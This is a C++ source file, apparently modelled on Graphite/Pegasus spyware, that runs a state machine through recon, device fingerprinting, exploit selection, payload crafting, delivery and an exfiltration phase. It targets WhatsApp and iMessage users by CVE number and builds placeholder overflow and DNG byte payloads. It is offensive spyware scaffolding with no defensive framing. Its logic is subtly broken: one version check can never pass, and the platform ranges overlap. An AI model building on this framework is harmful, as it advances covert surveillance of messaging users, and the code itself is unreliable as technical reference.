// graphite_engine.cpp - Operational Framework State Machine (C++)
// Adapted from Graphite/Pegasus research patterns

#include "graphite_engine.hpp"
#include <cstring>
#include <iostream>

namespace graphite {

void Engine::advanceTo(Phase p) {
    bool legal = false;
    switch (p) {
        case Phase::ReconComplete:    legal = (phase_ == Phase::Dormant); break;
        case Phase::ExploitSelected:  legal = (phase_ == Phase::ReconComplete); break;
        case Phase::PayloadCrafted:   legal = (phase_ == Phase::ExploitSelected); break;
        case Phase::DeliveryInitiated: legal = (phase_ == Phase::PayloadCrafted); break;
        case Phase::DeliveryConfirmed: legal = (phase_ == Phase::DeliveryInitiated); break;
        case Phase::ExfilActive:      legal = isExfilReady(); break;
        case Phase::Terminal:         legal = true; break;
        default:                     legal = false; break;
    }

    if (!legal) {
        bus_.emit({"engine.transition_rejected", "target=" + std::string(phaseName(p))});
        return;
    }

    phase_ = p;
    bus_.emit({"engine.phase", "entered=" + std::string(phaseName(p))});
}

std::string Engine::fingerprintDevice(const Target& t) {
    uint32_t spk = t.signed_pk_id;

    // iOS detection: Signed PK IDs in 0x800000+ range
    if (spk >= 0x800000 && spk <= 0x9FFFFF) {
        return "iOS";
    }
    // Android detection: Signed PK IDs in 0x100000-0xFFFFFF range
    else if (spk >= 0x100000 && spk <= 0xFFFFFF) {
        return "Android";
    }
    // OTPK-based detection
    else if (!t.otpk_ids.empty()) {
        if (t.otpk_ids[0] > 0x1000000) {
            return "iOS";
        } else {
            return "Android";
        }
    }
    // Platform hint fallback
    else if (t.platform == "iOS") {
        return "iOS";
    } else if (t.platform == "Android") {
        return "Android";
    }
    return "Unknown";
}

std::string Engine::selectExploit(const Target& t) {
    std::string platform = t.fingerprint_platform;

    if (platform == "iOS") {
        // iOS-specific exploits
        if (t.ios_version >= 18 && t.ios_version < 18) {
            return "CVE-2025-43200";  // iMessage zero-click
        }
        if (t.ios_version >= 17) {
            return "CVE-2025-55177";  // WhatsApp zero-click DNG
        }
        return "CVE-2019-3568";  // Universal
    } else if (platform == "Android") {
        return "CVE-2019-3568";  // Universal
    }
    return "CVE-2019-3568";  // Default to universal
}

std::vector<uint8_t> Engine::craftPayload(const std::string& cve) {
    std::vector<uint8_t> payload;

    if (cve == "CVE-2019-3568") {
        // RTCP overflow payload
        uint8_t sc[] = {0x41, 0x41, 0x41, 0x41};
        payload.insert(payload.end(), sc, sc + 4);
        // Add overflow data
        payload.resize(4096, 0x41);
    } else if (cve == "CVE-2025-55177") {
        // DNG payload
        uint8_t dng_header[] = {0x49, 0x49, 0x2A, 0x00};
        payload.insert(payload.end(), dng_header, dng_header + 4);
        // SOF3 marker
        uint8_t sof3[] = {0xFF, 0xC3, 0x00, 0x0B, 0x08, 0x00, 0x10, 0x00, 0x10, 0x03, 0x01, 0x11};
        payload.insert(payload.end(), sof3, sof3 + 12);
        payload.resize(1024, 0x00);
    } else if (cve == "CVE-2025-43200") {
        // iMessage DNG payload
        uint8_t dng[] = {0x49, 0x49, 0x2A, 0x00};
        payload.insert(payload.end(), dng, dng + 4);
        payload.resize(1024, 0x00);
    }

    return payload;
}

bool Engine::deliver(Target& t, const std::vector<uint8_t>& payload, const std::string& cve) {
    // Delivery via WhatsApp/iMessage
    // In real implementation, this would use the native platform's
    // messaging APIs to send the crafted payload
    t.delivered = true;
    t.delivery_id = "msg_" + std::to_string(time(nullptr));
    return true;
}

} // namespace graphite

// Main for testing
int main() {
    graphite::EventBus bus;
    graphite::Engine engine(bus);

    graphite::Target t;
    t.jid = "target@example.com";
    t.platform = "iOS";
    t.ios_version = 17;
    t.signed_pk_id = 8437760;  // decimal = 0x80C000
    t.otpk_ids = {8455555};

    engine.advanceTo(graphite::Phase::ReconComplete);
    t.fingerprint_platform = engine.fingerprintDevice(t);
    std::cout << "Fingerprint: " << t.fingerprint_platform << std::endl;

    engine.advanceTo(graphite::Phase::ExploitSelected);
    t.selected_cve = engine.selectExploit(t);
    std::cout << "Exploit: " << t.selected_cve << std::endl;

    engine.advanceTo(graphite::Phase::PayloadCrafted);
    auto payload = engine.craftPayload(t.selected_cve);
    std::cout << "Payload: " << payload.size() << " bytes" << std::endl;

    engine.advanceTo(graphite::Phase::DeliveryInitiated);
    bool delivered = engine.deliver(t, payload, t.selected_cve);
    std::cout << "Delivered: " << (delivered ? "YES" : "NO") << std::endl;

    engine.advanceTo(graphite::Phase::DeliveryConfirmed);
    std::cout << "Phase: " << graphite::phaseName(engine.current()) << std::endl;

    for (const auto& e : bus.log()) {
        std::cout << "  Event: " << e.source << " - " << e.detail << std::endl;
    }

    return 0;
}
